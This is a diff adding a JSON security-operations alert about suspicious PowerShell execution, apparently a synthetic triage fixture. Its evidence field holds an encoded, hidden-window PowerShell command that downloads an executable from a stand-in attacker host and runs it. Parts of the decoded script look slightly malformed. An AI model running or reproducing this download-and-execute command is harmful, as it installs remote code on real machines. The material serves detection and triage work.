@@ -1,0 +1,17 @@
+{
+  "alert_id": "SOC-10003",
+  "alert_name": "Suspicious PowerShell Script Execution",
+  "start_time": "2026-01-27T22:15:00.000Z",
+  "source_ip": "10.10.50.44",
+  "endpoint": "GF3456",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "user_id": "bfb6bcd037f84b0b96b4bfac5dfaf77c",
+  "description": "A suspicious PowerShell script was executed on the host.",
+  "evidence": {
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AdABvAHAALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgA7ACQAcABhAHQAaAAgAD0AIAAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAcgAuAGUAeABlACIAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAHMAdAByAGkAbgBnAF0AKQAuAEEAZABkACgAIAAiAFsAVwBhAHIAbgBpAG4AZwBdACAAUwB5AHMAdABlAG0AIABVAHAAZABhAHQAZQAgAFIAZQBxAHUAaQByAGUAZAAiACkAOwBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJAB1AHIAbAAsACAAJABwAGEAdABoACkAOwAmACAAJABwAGEAdABoAA==",
+    "initiating_process": "powershell.exe",
+    "process_sha256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
+    "parent_process": "svchost.exe",
+    "file_path": "C:\\Windows\\Temp\\system_maintenance.ps1"
+  }
+}
